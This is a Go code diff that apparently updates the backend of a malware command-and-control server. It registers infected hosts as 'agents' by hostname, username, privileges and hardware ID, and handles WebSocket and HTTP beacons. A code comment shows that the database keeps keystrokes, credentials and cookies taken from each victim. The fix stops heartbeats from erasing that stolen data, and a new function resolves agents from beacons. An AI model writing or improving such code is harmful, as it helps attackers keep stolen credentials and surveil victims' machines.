@@ -102,6 +102,11 @@ func (m *Manager) Register(reg *RegistrationData, wsConn *websocket.Conn, ip str
 		agent.PID = reg.PID
 		agent.Privileges = reg.Privileges
 		agent.BuildVersion = reg.BuildVersion
+		agent.OSVersion = reg.OSVersion
+		agent.Username = reg.Username
+		agent.Hostname = reg.Hostname
+		agent.Capabilities = reg.Capabilities
+		go m.persistAgent(agent)
 	} else {
 		// New agent
 		agent = &Agent{
@@ -128,13 +133,15 @@ func (m *Manager) Register(reg *RegistrationData, wsConn *websocket.Conn, ip str
 	}
 
 	// Setup WS connection
-	agent.WSConn = &WSConnection{
-		Conn:     wsConn,
-		SendChan: make(chan []byte, 100),
-		LastPing: time.Now(),
-	}
+	if wsConn != nil {
+		agent.WSConn = &WSConnection{
+			Conn:     wsConn,
+			SendChan: make(chan []byte, 100),
+			LastPing: time.Now(),
+		}
 
-	go m.handleAgentWS(agent)
+		go m.handleAgentWS(agent)
+	}
 
 	log.Printf("[agent] Registered: %s (%s\\%s) session=%d", agent.ID, agent.Hostname, agent.Username, agent.SessionID)
 	return agent, nil
@@ -150,10 +157,32 @@ func (m *Manager) persistAgent(a *Agent) {
 	tags, _ := json.Marshal(a.Tags)
 	metadata, _ := json.Marshal(a.Metadata)
 
+	// NOTE: must be a true upsert. INSERT OR REPLACE deletes the old row,
+	// which CASCADE-deletes every keystroke/credential/cookie row that
+	// references this agent (foreign_keys is ON). UpdateLastSeen runs this
+	// on every beacon, so the REPLACE version silently wiped all collected
+	// data on each heartbeat.
 	_, err := m.db.Exec(`
-		INSERT OR REPLACE INTO agents 
+		INSERT INTO agents 
 		(id, session_id, hostname, username, os_version, arch, pid, privileges, hw_id, build_version, first_seen, last_seen, ip_address, country, tags, notes, status, metadata)
 		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+		ON CONFLICT(id) DO UPDATE SET
+			session_id=excluded.session_id,
+			hostname=excluded.hostname,
+			username=excluded.username,
+			os_version=excluded.os_version,
+			arch=excluded.arch,
+			pid=excluded.pid,
+			privileges=excluded.privileges,
+			hw_id=excluded.hw_id,
+			build_version=excluded.build_version,
+			last_seen=excluded.last_seen,
+			ip_address=excluded.ip_address,
+			country=excluded.country,
+			tags=excluded.tags,
+			notes=excluded.notes,
+			status=excluded.status,
+			metadata=excluded.metadata
 	`, a.ID, a.SessionID, a.Hostname, a.Username, a.OSVersion, a.Arch, a.PID, a.Privileges, a.HwID, a.BuildVersion,
 		a.FirstSeen, a.LastSeen, a.IPAddress, a.Country, string(tags), a.Notes, a.Status, string(metadata))
 
@@ -210,6 +239,18 @@ func (m *Manager) Get(id string) (*Agent, bool) {
 	defer m.mu.RUnlock()
 	a, ok := m.agents[id]
 	return a, ok
+}
+
+// GetByHwID resolves an agent from the hardware id reported in HTTP beacons.
+func (m *Manager) GetByHwID(hw string) (*Agent, bool) {
+	m.mu.RLock()
+	defer m.mu.RUnlock()
+	for _, a := range m.agents {
+		if a.HwID == hw && a.Status != "dead" {
+			return a, true
+		}
+	}
+	return nil, false
 }
 
 func (m *Manager) GetBySessionID(sessionID uint32) (*Agent, bool) {
@@ -371,13 +412,14 @@ func (m *Manager) CountActive() int {
 }
 
 type RegistrationData struct {
-	Hostname     string
-	Username     string
-	OSVersion    string
-	Arch         string
-	PID          int
-	Privileges   int
-	HwID         string
-	BuildVersion int
-	Capabilities []string
+	Type         string   `json:"type"`
+	Hostname     string   `json:"hostname"`
+	Username     string   `json:"username"`
+	OSVersion    string   `json:"os_version"`
+	Arch         string   `json:"arch"`
+	PID          int      `json:"pid"`
+	Privileges   int      `json:"privileges"`
+	HwID         string   `json:"hw_id"`
+	BuildVersion int      `json:"build_version"`
+	Capabilities []string `json:"capabilities"`
 }
